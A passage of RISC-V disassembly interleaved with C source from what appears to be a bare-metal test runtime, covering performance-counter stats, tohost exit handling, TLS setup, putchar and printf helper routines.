    800019f6:	a9e70713          	addi	a4,a4,-1378 # 8001b490 <counter_names>
    800019fa:	fdc42783          	lw	a5,-36(s0)
    800019fe:	078e                	slli	a5,a5,0x3
    80001a00:	97ba                	add	a5,a5,a4
    80001a02:	00001717          	auipc	a4,0x1
    80001a06:	f7670713          	addi	a4,a4,-138 # 80002978 <atol+0x244>
    80001a0a:	e398                	sd	a4,0(a5)
    80001a0c:	fdc42783          	lw	a5,-36(s0)
    80001a10:	0017871b          	addiw	a4,a5,1
    80001a14:	fce42e23          	sw	a4,-36(s0)
    80001a18:	0001a717          	auipc	a4,0x1a
    80001a1c:	a6870713          	addi	a4,a4,-1432 # 8001b480 <counters>
    80001a20:	078e                	slli	a5,a5,0x3
    80001a22:	97ba                	add	a5,a5,a4
    80001a24:	fe843703          	ld	a4,-24(s0)
    80001a28:	e398                	sd	a4,0(a5)
  READ_CTR(minstret);
    80001a2a:	fdc42783          	lw	a5,-36(s0)
    80001a2e:	0007871b          	sext.w	a4,a5
    80001a32:	4785                	li	a5,1
    80001a34:	fee7cbe3          	blt	a5,a4,80001a2a <setStats+0x8c>
    80001a38:	b02027f3          	csrr	a5,minstret
    80001a3c:	fcf43423          	sd	a5,-56(s0)
    80001a40:	fc843783          	ld	a5,-56(s0)
    80001a44:	fef43023          	sd	a5,-32(s0)
    80001a48:	fbc42783          	lw	a5,-68(s0)
    80001a4c:	2781                	sext.w	a5,a5
    80001a4e:	ef8d                	bnez	a5,80001a88 <setStats+0xea>
    80001a50:	0001a717          	auipc	a4,0x1a
    80001a54:	a3070713          	addi	a4,a4,-1488 # 8001b480 <counters>
    80001a58:	fdc42783          	lw	a5,-36(s0)
    80001a5c:	078e                	slli	a5,a5,0x3
    80001a5e:	97ba                	add	a5,a5,a4
    80001a60:	639c                	ld	a5,0(a5)
    80001a62:	fe043703          	ld	a4,-32(s0)
    80001a66:	40f707b3          	sub	a5,a4,a5
    80001a6a:	fef43023          	sd	a5,-32(s0)
    80001a6e:	0001a717          	auipc	a4,0x1a
    80001a72:	a2270713          	addi	a4,a4,-1502 # 8001b490 <counter_names>
    80001a76:	fdc42783          	lw	a5,-36(s0)
    80001a7a:	078e                	slli	a5,a5,0x3
    80001a7c:	97ba                	add	a5,a5,a4
    80001a7e:	00001717          	auipc	a4,0x1
    80001a82:	f0270713          	addi	a4,a4,-254 # 80002980 <atol+0x24c>
    80001a86:	e398                	sd	a4,0(a5)
    80001a88:	fdc42783          	lw	a5,-36(s0)
    80001a8c:	0017871b          	addiw	a4,a5,1
    80001a90:	fce42e23          	sw	a4,-36(s0)
    80001a94:	0001a717          	auipc	a4,0x1a
    80001a98:	9ec70713          	addi	a4,a4,-1556 # 8001b480 <counters>
    80001a9c:	078e                	slli	a5,a5,0x3
    80001a9e:	97ba                	add	a5,a5,a4
    80001aa0:	fe043703          	ld	a4,-32(s0)
    80001aa4:	e398                	sd	a4,0(a5)

#undef READ_CTR
}
    80001aa6:	0001                	nop
    80001aa8:	6426                	ld	s0,72(sp)
    80001aaa:	6161                	addi	sp,sp,80
    80001aac:	8082                	ret

0000000080001aae <tohost_exit>:

void __attribute__((noreturn)) tohost_exit(uintptr_t code)
{
    80001aae:	1101                	addi	sp,sp,-32
    80001ab0:	ec22                	sd	s0,24(sp)
    80001ab2:	1000                	addi	s0,sp,32
    80001ab4:	fea43423          	sd	a0,-24(s0)
  tohost = (code << 1) | 1;
    80001ab8:	fe843783          	ld	a5,-24(s0)
    80001abc:	0786                	slli	a5,a5,0x1
    80001abe:	0017e713          	ori	a4,a5,1
    80001ac2:	fffff797          	auipc	a5,0xfffff
    80001ac6:	53e78793          	addi	a5,a5,1342 # 80001000 <tohost>
    80001aca:	e398                	sd	a4,0(a5)
  while (1);
    80001acc:	a001                	j	80001acc <tohost_exit+0x1e>

0000000080001ace <handle_trap>:
}

uintptr_t __attribute__((weak)) handle_trap(uintptr_t cause, uintptr_t epc, uintptr_t regs[32])
{
    80001ace:	7179                	addi	sp,sp,-48
    80001ad0:	f406                	sd	ra,40(sp)
    80001ad2:	f022                	sd	s0,32(sp)
    80001ad4:	1800                	addi	s0,sp,48
    80001ad6:	fea43423          	sd	a0,-24(s0)
    80001ada:	feb43023          	sd	a1,-32(s0)
    80001ade:	fcc43c23          	sd	a2,-40(s0)
  tohost_exit(1337);
    80001ae2:	53900513          	li	a0,1337
    80001ae6:	fc9ff0ef          	jal	ra,80001aae <tohost_exit>

0000000080001aea <exit>:
}

void exit(int code)
{
    80001aea:	1101                	addi	sp,sp,-32
    80001aec:	ec06                	sd	ra,24(sp)
    80001aee:	e822                	sd	s0,16(sp)
    80001af0:	1000                	addi	s0,sp,32
    80001af2:	87aa                	mv	a5,a0
    80001af4:	fef42623          	sw	a5,-20(s0)
  tohost_exit(code);
    80001af8:	fec42783          	lw	a5,-20(s0)
    80001afc:	853e                	mv	a0,a5
    80001afe:	fb1ff0ef          	jal	ra,80001aae <tohost_exit>

0000000080001b02 <abort>:
}

void abort()
{
    80001b02:	1141                	addi	sp,sp,-16
    80001b04:	e406                	sd	ra,8(sp)
    80001b06:	e022                	sd	s0,0(sp)
    80001b08:	0800                	addi	s0,sp,16
  exit(128 + SIGABRT);
    80001b0a:	08600513          	li	a0,134
    80001b0e:	fddff0ef          	jal	ra,80001aea <exit>

0000000080001b12 <printstr>:
}

void printstr(const char* s)
{
    80001b12:	7179                	addi	sp,sp,-48
    80001b14:	f406                	sd	ra,40(sp)
    80001b16:	f022                	sd	s0,32(sp)
    80001b18:	ec26                	sd	s1,24(sp)
    80001b1a:	1800                	addi	s0,sp,48
    80001b1c:	fca43c23          	sd	a0,-40(s0)
  syscall(SYS_write, 1, (uintptr_t)s, strlen(s));
    80001b20:	fd843483          	ld	s1,-40(s0)
    80001b24:	fd843503          	ld	a0,-40(s0)
    80001b28:	2c9000ef          	jal	ra,800025f0 <strlen>
    80001b2c:	87aa                	mv	a5,a0
    80001b2e:	86be                	mv	a3,a5
    80001b30:	8626                	mv	a2,s1
    80001b32:	4585                	li	a1,1
    80001b34:	04000513          	li	a0,64
    80001b38:	de9ff0ef          	jal	ra,80001920 <syscall>
}
    80001b3c:	0001                	nop
    80001b3e:	70a2                	ld	ra,40(sp)
    80001b40:	7402                	ld	s0,32(sp)
    80001b42:	64e2                	ld	s1,24(sp)
    80001b44:	6145                	addi	sp,sp,48
    80001b46:	8082                	ret

0000000080001b48 <thread_entry>:

void __attribute__((weak)) thread_entry(int cid, int nc)
{
    80001b48:	1101                	addi	sp,sp,-32
    80001b4a:	ec22                	sd	s0,24(sp)
    80001b4c:	1000                	addi	s0,sp,32
    80001b4e:	87aa                	mv	a5,a0
    80001b50:	872e                	mv	a4,a1
    80001b52:	fef42623          	sw	a5,-20(s0)
    80001b56:	87ba                	mv	a5,a4
    80001b58:	fef42423          	sw	a5,-24(s0)
  // multi-threaded programs override this function.
  // for the case of single-threaded programs, only let core 0 proceed.
  while (cid != 0);
    80001b5c:	fec42783          	lw	a5,-20(s0)
    80001b60:	2781                	sext.w	a5,a5
    80001b62:	ffed                	bnez	a5,80001b5c <thread_entry+0x14>
}
    80001b64:	0001                	nop
    80001b66:	0001                	nop
    80001b68:	6462                	ld	s0,24(sp)
    80001b6a:	6105                	addi	sp,sp,32
    80001b6c:	8082                	ret

int __attribute__((weak)) main(int argc, char** argv)
{
    80001b6e:	1101                	addi	sp,sp,-32
    80001b70:	ec06                	sd	ra,24(sp)
    80001b72:	e822                	sd	s0,16(sp)
    80001b74:	1000                	addi	s0,sp,32
    80001b76:	87aa                	mv	a5,a0
    80001b78:	feb43023          	sd	a1,-32(s0)
    80001b7c:	fef42623          	sw	a5,-20(s0)
  // single-threaded programs override this function.
  printstr("Implement main(), foo!\n");
    80001b80:	00001517          	auipc	a0,0x1
    80001b84:	e1050513          	addi	a0,a0,-496 # 80002990 <atol+0x25c>
    80001b88:	f8bff0ef          	jal	ra,80001b12 <printstr>
  return -1;
    80001b8c:	57fd                	li	a5,-1
}
    80001b8e:	853e                	mv	a0,a5
    80001b90:	60e2                	ld	ra,24(sp)
    80001b92:	6442                	ld	s0,16(sp)
    80001b94:	6105                	addi	sp,sp,32
    80001b96:	8082                	ret

0000000080001b98 <init_tls>:

static void init_tls()
{
    80001b98:	1101                	addi	sp,sp,-32
    80001b9a:	ec06                	sd	ra,24(sp)
    80001b9c:	e822                	sd	s0,16(sp)
    80001b9e:	1000                	addi	s0,sp,32
  register void* thread_pointer asm("tp");
  extern char _tls_data;
  extern __thread char _tdata_begin, _tdata_end, _tbss_end;
  size_t tdata_size = &_tdata_end - &_tdata_begin;
    80001ba0:	00020713          	mv	a4,tp
    80001ba4:	00020793          	mv	a5,tp
    80001ba8:	40f707b3          	sub	a5,a4,a5
    80001bac:	fef43423          	sd	a5,-24(s0)
  memcpy(thread_pointer, &_tls_data, tdata_size);
    80001bb0:	8792                	mv	a5,tp
    80001bb2:	fe843603          	ld	a2,-24(s0)
    80001bb6:	0001a597          	auipc	a1,0x1a
    80001bba:	90a58593          	addi	a1,a1,-1782 # 8001b4c0 <_end>
    80001bbe:	853e                	mv	a0,a5
    80001bc0:	0ab000ef          	jal	ra,8000246a <memcpy>
  size_t tbss_size = &_tbss_end - &_tdata_end;
    80001bc4:	08420713          	addi	a4,tp,132 # 84 <_tbss_end>
    80001bc8:	00020793          	mv	a5,tp
    80001bcc:	40f707b3          	sub	a5,a4,a5
    80001bd0:	fef43023          	sd	a5,-32(s0)
  memset(thread_pointer + tdata_size, 0, tbss_size);
    80001bd4:	8712                	mv	a4,tp
    80001bd6:	fe843783          	ld	a5,-24(s0)
    80001bda:	97ba                	add	a5,a5,a4
    80001bdc:	fe043603          	ld	a2,-32(s0)
    80001be0:	4581                	li	a1,0
    80001be2:	853e                	mv	a0,a5
    80001be4:	13f000ef          	jal	ra,80002522 <memset>
}
    80001be8:	0001                	nop
    80001bea:	60e2                	ld	ra,24(sp)
    80001bec:	6442                	ld	s0,16(sp)
    80001bee:	6105                	addi	sp,sp,32
    80001bf0:	8082                	ret

0000000080001bf2 <_init>:

void _init(int cid, int nc)
{
    80001bf2:	7171                	addi	sp,sp,-176
    80001bf4:	f506                	sd	ra,168(sp)
    80001bf6:	f122                	sd	s0,160(sp)
    80001bf8:	ed26                	sd	s1,152(sp)
    80001bfa:	1900                	addi	s0,sp,176
    80001bfc:	87aa                	mv	a5,a0
    80001bfe:	872e                	mv	a4,a1
    80001c00:	f4f42e23          	sw	a5,-164(s0)
    80001c04:	87ba                	mv	a5,a4
    80001c06:	f4f42c23          	sw	a5,-168(s0)
    80001c0a:	fe040793          	addi	a5,s0,-32
    80001c0e:	f4f43823          	sd	a5,-176(s0)
    80001c12:	f5043783          	ld	a5,-176(s0)
    80001c16:	f8078793          	addi	a5,a5,-128
    80001c1a:	03f78793          	addi	a5,a5,63
    80001c1e:	8399                	srli	a5,a5,0x6
    80001c20:	00679493          	slli	s1,a5,0x6
  init_tls();
    80001c24:	f75ff0ef          	jal	ra,80001b98 <init_tls>
  thread_entry(cid, nc);
    80001c28:	f5842703          	lw	a4,-168(s0)
    80001c2c:	f5c42783          	lw	a5,-164(s0)
    80001c30:	85ba                	mv	a1,a4
    80001c32:	853e                	mv	a0,a5
    80001c34:	f15ff0ef          	jal	ra,80001b48 <thread_entry>

  // only single-threaded programs should ever get here.
  int ret = main(0, 0);
    80001c38:	4581                	li	a1,0
    80001c3a:	4501                	li	a0,0
    80001c3c:	e78ff0ef          	jal	ra,800012b4 <main>
    80001c40:	87aa                	mv	a5,a0
    80001c42:	fcf42823          	sw	a5,-48(s0)

  char buf[NUM_COUNTERS * 32] __attribute__((aligned(64)));
  char* pbuf = buf;
    80001c46:	fc943c23          	sd	s1,-40(s0)
  for (int i = 0; i < NUM_COUNTERS; i++)
    80001c4a:	fc042a23          	sw	zero,-44(s0)
    80001c4e:	a095                	j	80001cb2 <_init+0xc0>
    if (counters[i])
    80001c50:	0001a717          	auipc	a4,0x1a
    80001c54:	83070713          	addi	a4,a4,-2000 # 8001b480 <counters>
    80001c58:	fd442783          	lw	a5,-44(s0)
    80001c5c:	078e                	slli	a5,a5,0x3
    80001c5e:	97ba                	add	a5,a5,a4
    80001c60:	639c                	ld	a5,0(a5)
    80001c62:	c3b9                	beqz	a5,80001ca8 <_init+0xb6>
      pbuf += sprintf(pbuf, "%s = %ld\n", counter_names[i], counters[i]);
    80001c64:	0001a717          	auipc	a4,0x1a
    80001c68:	82c70713          	addi	a4,a4,-2004 # 8001b490 <counter_names>
    80001c6c:	fd442783          	lw	a5,-44(s0)
    80001c70:	078e                	slli	a5,a5,0x3
    80001c72:	97ba                	add	a5,a5,a4
    80001c74:	6390                	ld	a2,0(a5)
    80001c76:	0001a717          	auipc	a4,0x1a
    80001c7a:	80a70713          	addi	a4,a4,-2038 # 8001b480 <counters>
    80001c7e:	fd442783          	lw	a5,-44(s0)
    80001c82:	078e                	slli	a5,a5,0x3
    80001c84:	97ba                	add	a5,a5,a4
    80001c86:	639c                	ld	a5,0(a5)
    80001c88:	86be                	mv	a3,a5
    80001c8a:	00001597          	auipc	a1,0x1
    80001c8e:	d1e58593          	addi	a1,a1,-738 # 800029a8 <atol+0x274>
    80001c92:	fd843503          	ld	a0,-40(s0)
    80001c96:	712000ef          	jal	ra,800023a8 <sprintf>
    80001c9a:	87aa                	mv	a5,a0
    80001c9c:	873e                	mv	a4,a5
    80001c9e:	fd843783          	ld	a5,-40(s0)
    80001ca2:	97ba                	add	a5,a5,a4
    80001ca4:	fcf43c23          	sd	a5,-40(s0)
  for (int i = 0; i < NUM_COUNTERS; i++)
    80001ca8:	fd442783          	lw	a5,-44(s0)
    80001cac:	2785                	addiw	a5,a5,1
    80001cae:	fcf42a23          	sw	a5,-44(s0)
    80001cb2:	fd442783          	lw	a5,-44(s0)
    80001cb6:	0007871b          	sext.w	a4,a5
    80001cba:	4785                	li	a5,1
    80001cbc:	f8e7dae3          	ble	a4,a5,80001c50 <_init+0x5e>
  if (pbuf != buf)
    80001cc0:	fd843783          	ld	a5,-40(s0)
    80001cc4:	00f48563          	beq	s1,a5,80001cce <_init+0xdc>
    printstr(buf);
    80001cc8:	8526                	mv	a0,s1
    80001cca:	e49ff0ef          	jal	ra,80001b12 <printstr>

  exit(ret);
    80001cce:	fd042783          	lw	a5,-48(s0)
    80001cd2:	853e                	mv	a0,a5
    80001cd4:	e17ff0ef          	jal	ra,80001aea <exit>

0000000080001cd8 <putchar>:
}

#undef putchar
int putchar(int ch)
{
    80001cd8:	1101                	addi	sp,sp,-32
    80001cda:	ec06                	sd	ra,24(sp)
    80001cdc:	e822                	sd	s0,16(sp)
    80001cde:	1000                	addi	s0,sp,32
    80001ce0:	87aa                	mv	a5,a0
    80001ce2:	fef42623          	sw	a5,-20(s0)
  static __thread char buf[64] __attribute__((aligned(64)));
  static __thread int buflen = 0;

  buf[buflen++] = ch;
    80001ce6:	08022783          	lw	a5,128(tp) # 80 <buflen.2991>
    80001cea:	0017871b          	addiw	a4,a5,1
    80001cee:	0007069b          	sext.w	a3,a4
    80001cf2:	08d22023          	sw	a3,128(tp) # 80 <buflen.2991>
    80001cf6:	fec42703          	lw	a4,-20(s0)
    80001cfa:	0ff77713          	andi	a4,a4,255
    80001cfe:	04020693          	addi	a3,tp,64 # 40 <buf.2990>
    80001d02:	97b6                	add	a5,a5,a3
    80001d04:	00e78023          	sb	a4,0(a5)

  if (ch == '\n' || buflen == sizeof(buf))
    80001d08:	fec42783          	lw	a5,-20(s0)
    80001d0c:	0007871b          	sext.w	a4,a5
    80001d10:	47a9                	li	a5,10
    80001d12:	00f70963          	beq	a4,a5,80001d24 <putchar+0x4c>
    80001d16:	08022783          	lw	a5,128(tp) # 80 <buflen.2991>
    80001d1a:	873e                	mv	a4,a5
    80001d1c:	04000793          	li	a5,64
    80001d20:	00f71f63          	bne	a4,a5,80001d3e <putchar+0x66>
  {
    syscall(SYS_write, 1, (uintptr_t)buf, buflen);
    80001d24:	04020713          	addi	a4,tp,64 # 40 <buf.2990>
    80001d28:	08022783          	lw	a5,128(tp) # 80 <buflen.2991>
    80001d2c:	86be                	mv	a3,a5
    80001d2e:	863a                	mv	a2,a4
    80001d30:	4585                	li	a1,1
    80001d32:	04000513          	li	a0,64
    80001d36:	bebff0ef          	jal	ra,80001920 <syscall>
    buflen = 0;
    80001d3a:	08022023          	sw	zero,128(tp) # 80 <buflen.2991>
  }

  return 0;
    80001d3e:	4781                	li	a5,0
}
    80001d40:	853e                	mv	a0,a5
    80001d42:	60e2                	ld	ra,24(sp)
    80001d44:	6442                	ld	s0,16(sp)
    80001d46:	6105                	addi	sp,sp,32
    80001d48:	8082                	ret

0000000080001d4a <printhex>:

void printhex(uint64_t x)
{
    80001d4a:	7139                	addi	sp,sp,-64
    80001d4c:	fc06                	sd	ra,56(sp)
    80001d4e:	f822                	sd	s0,48(sp)
    80001d50:	0080                	addi	s0,sp,64
    80001d52:	fca43423          	sd	a0,-56(s0)
  char str[17];
  int i;
  for (i = 0; i < 16; i++)
    80001d56:	fe042623          	sw	zero,-20(s0)
    80001d5a:	a8a1                	j	80001db2 <printhex+0x68>
  {
    str[15-i] = (x & 0xF) + ((x & 0xF) < 10 ? '0' : 'a'-10);
    80001d5c:	fc843783          	ld	a5,-56(s0)
    80001d60:	0ff7f793          	andi	a5,a5,255
    80001d64:	8bbd                	andi	a5,a5,15
    80001d66:	0ff7f713          	andi	a4,a5,255
    80001d6a:	fc843783          	ld	a5,-56(s0)
    80001d6e:	00f7f693          	andi	a3,a5,15
    80001d72:	47a5                	li	a5,9
    80001d74:	00d7e563          	bltu	a5,a3,80001d7e <printhex+0x34>
    80001d78:	03000793          	li	a5,48
    80001d7c:	a019                	j	80001d82 <printhex+0x38>
    80001d7e:	05700793          	li	a5,87
    80001d82:	463d                	li	a2,15
    80001d84:	fec42683          	lw	a3,-20(s0)
    80001d88:	40d606bb          	subw	a3,a2,a3
    80001d8c:	2681                	sext.w	a3,a3
    80001d8e:	9fb9                	addw	a5,a5,a4
    80001d90:	0ff7f713          	andi	a4,a5,255
    80001d94:	ff040793          	addi	a5,s0,-16
    80001d98:	97b6                	add	a5,a5,a3
    80001d9a:	fee78423          	sb	a4,-24(a5)
    x >>= 4;
    80001d9e:	fc843783          	ld	a5,-56(s0)
    80001da2:	8391                	srli	a5,a5,0x4
    80001da4:	fcf43423          	sd	a5,-56(s0)
  for (i = 0; i < 16; i++)
    80001da8:	fec42783          	lw	a5,-20(s0)
    80001dac:	2785                	addiw	a5,a5,1
    80001dae:	fef42623          	sw	a5,-20(s0)
    80001db2:	fec42783          	lw	a5,-20(s0)
    80001db6:	0007871b          	sext.w	a4,a5
    80001dba:	47bd                	li	a5,15
    80001dbc:	fae7d0e3          	ble	a4,a5,80001d5c <printhex+0x12>
  }
  str[16] = 0;
    80001dc0:	fe040423          	sb	zero,-24(s0)

  printstr(str);
    80001dc4:	fd840793          	addi	a5,s0,-40
    80001dc8:	853e                	mv	a0,a5
    80001dca:	d49ff0ef          	jal	ra,80001b12 <printstr>
}
    80001dce:	0001                	nop
    80001dd0:	70e2                	ld	ra,56(sp)
    80001dd2:	7442                	ld	s0,48(sp)
    80001dd4:	6121                	addi	sp,sp,64
    80001dd6:	8082                	ret

0000000080001dd8 <printnum>:

static inline void printnum(void (*putch)(int, void**), void **putdat,
                    unsigned long long num, unsigned base, int width, int padc)
{
    80001dd8:	714d                	addi	sp,sp,-336
    80001dda:	e686                	sd	ra,328(sp)
    80001ddc:	e2a2                	sd	s0,320(sp)
    80001dde:	0a80                	addi	s0,sp,336
    80001de0:	eca43c23          	sd	a0,-296(s0)
    80001de4:	ecb43823          	sd	a1,-304(s0)
    80001de8:	ecc43423          	sd	a2,-312(s0)
    80001dec:	8636                	mv	a2,a3
    80001dee:	86ba                	mv	a3,a4
    80001df0:	873e                	mv	a4,a5
    80001df2:	87b2                	mv	a5,a2
    80001df4:	ecf42223          	sw	a5,-316(s0)
    80001df8:	87b6                	mv	a5,a3
    80001dfa:	ecf42023          	sw	a5,-320(s0)
    80001dfe:	87ba                	mv	a5,a4
    80001e00:	eaf42e23          	sw	a5,-324(s0)
  unsigned digs[sizeof(num)*CHAR_BIT];
  int pos = 0;
    80001e04:	fe042623          	sw	zero,-20(s0)

  while (1)
  {
    digs[pos++] = num % base;
    80001e08:	ec446783          	lwu	a5,-316(s0)
    80001e0c:	ec843703          	ld	a4,-312(s0)
    80001e10:	02f776b3          	remu	a3,a4,a5
    80001e14:	fec42783          	lw	a5,-20(s0)
    80001e18:	0017871b          	addiw	a4,a5,1
    80001e1c:	fee42623          	sw	a4,-20(s0)
    80001e20:	0006871b          	sext.w	a4,a3
    80001e24:	078a                	slli	a5,a5,0x2
    80001e26:	ff040693          	addi	a3,s0,-16
    80001e2a:	97b6                	add	a5,a5,a3
    80001e2c:	eee7ac23          	sw	a4,-264(a5)
    if (num < base)
    80001e30:	ec446783          	lwu	a5,-316(s0)
    80001e34:	ec843703          	ld	a4,-312(s0)
    80001e38:	00f76b63          	bltu	a4,a5,80001e4e <printnum+0x76>
      break;
    num /= base;
    80001e3c:	ec446783          	lwu	a5,-316(s0)
    80001e40:	ec843703          	ld	a4,-312(s0)
    80001e44:	02f757b3          	divu	a5,a4,a5
    80001e48:	ecf43423          	sd	a5,-312(s0)
    digs[pos++] = num % base;
    80001e4c:	bf75                	j	80001e08 <printnum+0x30>
      break;
    80001e4e:	0001                	nop
  }

  while (width-- > pos)
    80001e50:	a809                	j	80001e62 <printnum+0x8a>
    putch(padc, putdat);
    80001e52:	ebc42783          	lw	a5,-324(s0)
    80001e56:	ed843703          	ld	a4,-296(s0)
    80001e5a:	ed043583          	ld	a1,-304(s0)
    80001e5e:	853e                	mv	a0,a5
    80001e60:	9702                	jalr	a4
  while (width-- > pos)
    80001e62:	ec042783          	lw	a5,-320(s0)
    80001e66:	fff7871b          	addiw	a4,a5,-1
    80001e6a:	ece42023          	sw	a4,-320(s0)
    80001e6e:	fec42703          	lw	a4,-20(s0)
    80001e72:	2701                	sext.w	a4,a4
    80001e74:	fcf74fe3          	blt	a4,a5,80001e52 <printnum+0x7a>

  while (pos-- > 0)
    80001e78:	a099                	j	80001ebe <printnum+0xe6>
    putch(digs[pos] + (digs[pos] >= 10 ? 'a' - 10 : '0'), putdat);
    80001e7a:	fec42783          	lw	a5,-20(s0)
    80001e7e:	078a                	slli	a5,a5,0x2
    80001e80:	ff040713          	addi	a4,s0,-16
    80001e84:	97ba                	add	a5,a5,a4
    80001e86:	ef87a703          	lw	a4,-264(a5)
    80001e8a:	fec42783          	lw	a5,-20(s0)
    80001e8e:	078a                	slli	a5,a5,0x2
    80001e90:	ff040693          	addi	a3,s0,-16
    80001e94:	97b6                	add	a5,a5,a3
    80001e96:	ef87a783          	lw	a5,-264(a5)
    80001e9a:	86be                	mv	a3,a5
    80001e9c:	47a5                	li	a5,9
    80001e9e:	00d7f563          	bleu	a3,a5,80001ea8 <printnum+0xd0>
    80001ea2:	05700793          	li	a5,87
    80001ea6:	a019                	j	80001eac <printnum+0xd4>
    80001ea8:	03000793          	li	a5,48
    80001eac:	9fb9                	addw	a5,a5,a4
    80001eae:	2781                	sext.w	a5,a5
    80001eb0:	2781                	sext.w	a5,a5
    80001eb2:	ed843703          	ld	a4,-296(s0)
    80001eb6:	ed043583          	ld	a1,-304(s0)
    80001eba:	853e                	mv	a0,a5
    80001ebc:	9702                	jalr	a4
  while (pos-- > 0)
    80001ebe:	fec42783          	lw	a5,-20(s0)
    80001ec2:	fff7871b          	addiw	a4,a5,-1
    80001ec6:	fee42623          	sw	a4,-20(s0)
    80001eca:	faf048e3          	bgtz	a5,80001e7a <printnum+0xa2>
}
    80001ece:	0001                	nop
    80001ed0:	0001                	nop
    80001ed2:	60b6                	ld	ra,328(sp)
    80001ed4:	6416                	ld	s0,320(sp)
    80001ed6:	6171                	addi	sp,sp,336
    80001ed8:	8082                	ret

0000000080001eda <getuint>:

static unsigned long long getuint(va_list *ap, int lflag)
{
    80001eda:	1101                	addi	sp,sp,-32
    80001edc:	ec22                	sd	s0,24(sp)
    80001ede:	1000                	addi	s0,sp,32
    80001ee0:	fea43423          	sd	a0,-24(s0)
    80001ee4:	87ae                	mv	a5,a1
    80001ee6:	fef42223          	sw	a5,-28(s0)
  if (lflag >= 2)
    80001eea:	fe442783          	lw	a5,-28(s0)
    80001eee:	0007871b          	sext.w	a4,a5
    80001ef2:	4785                	li	a5,1
    80001ef4:	00e7dc63          	ble	a4,a5,80001f0c <getuint+0x32>
    return va_arg(*ap, unsigned long long);
    80001ef8:	fe843783          	ld	a5,-24(s0)
    80001efc:	639c                	ld	a5,0(a5)
    80001efe:	00878693          	addi	a3,a5,8
    80001f02:	fe843703          	ld	a4,-24(s0)
    80001f06:	e314                	sd	a3,0(a4)
    80001f08:	639c                	ld	a5,0(a5)
    80001f0a:	a815                	j	80001f3e <getuint+0x64>
  else if (lflag)
    80001f0c:	fe442783          	lw	a5,-28(s0)
    80001f10:	2781                	sext.w	a5,a5
    80001f12:	cb99                	beqz	a5,80001f28 <getuint+0x4e>
    return va_arg(*ap, unsigned long);
    80001f14:	fe843783          	ld	a5,-24(s0)
    80001f18:	639c                	ld	a5,0(a5)
    80001f1a:	00878693          	addi	a3,a5,8
    80001f1e:	fe843703          	ld	a4,-24(s0)
    80001f22:	e314                	sd	a3,0(a4)
    80001f24:	639c                	ld	a5,0(a5)
    80001f26:	a821                	j	80001f3e <getuint+0x64>
  else
    return va_arg(*ap, unsigned int);
    80001f28:	fe843783          	ld	a5,-24(s0)
    80001f2c:	639c                	ld	a5,0(a5)
    80001f2e:	00878693          	addi	a3,a5,8
    80001f32:	fe843703          	ld	a4,-24(s0)
    80001f36:	e314                	sd	a3,0(a4)
    80001f38:	439c                	lw	a5,0(a5)
    80001f3a:	1782                	slli	a5,a5,0x20
    80001f3c:	9381                	srli	a5,a5,0x20
}
    80001f3e:	853e                	mv	a0,a5
    80001f40:	6462                	ld	s0,24(sp)
    80001f42:	6105                	addi	sp,sp,32
    80001f44:	8082                	ret

0000000080001f46 <getint>:

static long long getint(va_list *ap, int lflag)
{
    80001f46:	1101                	addi	sp,sp,-32
    80001f48:	ec22                	sd	s0,24(sp)
    80001f4a:	1000                	addi	s0,sp,32
    80001f4c:	fea43423          	sd	a0,-24(s0)
    80001f50:	87ae                	mv	a5,a1
    80001f52:	fef42223          	sw	a5,-28(s0)
  if (lflag >= 2)
    80001f56:	fe442783          	lw	a5,-28(s0)
    80001f5a:	0007871b          	sext.w	a4,a5
    80001f5e:	4785                	li	a5,1
    80001f60:	00e7dc63          	ble	a4,a5,80001f78 <getint+0x32>
    return va_arg(*ap, long long);
    80001f64:	fe843783          	ld	a5,-24(s0)
    80001f68:	639c                	ld	a5,0(a5)
    80001f6a:	00878693          	addi	a3,a5,8
    80001f6e:	fe843703          	ld	a4,-24(s0)
    80001f72:	e314                	sd	a3,0(a4)
    80001f74:	639c                	ld	a5,0(a5)
    80001f76:	a805                	j	80001fa6 <getint+0x60>
  else if (lflag)
    80001f78:	fe442783          	lw	a5,-28(s0)
    80001f7c:	2781                	sext.w	a5,a5
    80001f7e:	cb99                	beqz	a5,80001f94 <getint+0x4e>
    return va_arg(*ap, long);
    80001f80:	fe843783          	ld	a5,-24(s0)
    80001f84:	639c                	ld	a5,0(a5)
    80001f86:	00878693          	addi	a3,a5,8
    80001f8a:	fe843703          	ld	a4,-24(s0)
    80001f8e:	e314                	sd	a3,0(a4)
    80001f90:	639c                	ld	a5,0(a5)
    80001f92:	a811                	j	80001fa6 <getint+0x60>
  else
    return va_arg(*ap, int);
    80001f94:	fe843783          	ld	a5,-24(s0)
    80001f98:	639c                	ld	a5,0(a5)
    80001f9a:	00878693          	addi	a3,a5,8
    80001f9e:	fe843703          	ld	a4,-24(s0)
    80001fa2:	e314                	sd	a3,0(a4)
    80001fa4:	439c                	lw	a5,0(a5)
}
    80001fa6:	853e                	mv	a0,a5
    80001fa8:	6462                	ld	s0,24(sp)
    80001faa:	6105                	addi	sp,sp,32
    80001fac:	8082                	ret

0000000080001fae <vprintfmt>:

static void vprintfmt(void (*putch)(int, void**), void **putdat, const char *fmt, va_list ap)
{
    80001fae:	7159                	addi	sp,sp,-112
    80001fb0:	f486                	sd	ra,104(sp)
    80001fb2:	f0a2                	sd	s0,96(sp)
    80001fb4:	eca6                	sd	s1,88(sp)
    80001fb6:	e8ca                	sd	s2,80(sp)
    80001fb8:	1880                	addi	s0,sp,112
    80001fba:	faa43423          	sd	a0,-88(s0)
    80001fbe:	fab43023          	sd	a1,-96(s0)
    80001fc2:	f8c43c23          	sd	a2,-104(s0)
    80001fc6:	f8d43823          	sd	a3,-112(s0)
  unsigned long long num;
  int base, lflag, width, precision, altflag;
  char padc;

  while (1) {
    while ((ch = *(unsigned char *) fmt) != '%') {
    80001fca:	a831                	j	80001fe6 <vprintfmt+0x38>
      if (ch == '\0')
    80001fcc:	32048963          	beqz	s1,800022fe <vprintfmt+0x350>
        return;
      fmt++;
    80001fd0:	f9843783          	ld	a5,-104(s0)
    80001fd4:	0785                	addi	a5,a5,1
    80001fd6:	f8f43c23          	sd	a5,-104(s0)
      putch(ch, putdat);
    80001fda:	fa843783          	ld	a5,-88(s0)
    80001fde:	fa043583          	ld	a1,-96(s0)
    80001fe2:	8526                	mv	a0,s1
    80001fe4:	9782                	jalr	a5
    while ((ch = *(unsigned char *) fmt) != '%') {
    80001fe6:	f9843783          	ld	a5,-104(s0)
    80001fea:	0007c783          	lbu	a5,0(a5)
    80001fee:	0007849b          	sext.w	s1,a5
    80001ff2:	8726                	mv	a4,s1
    80001ff4:	02500793          	li	a5,37
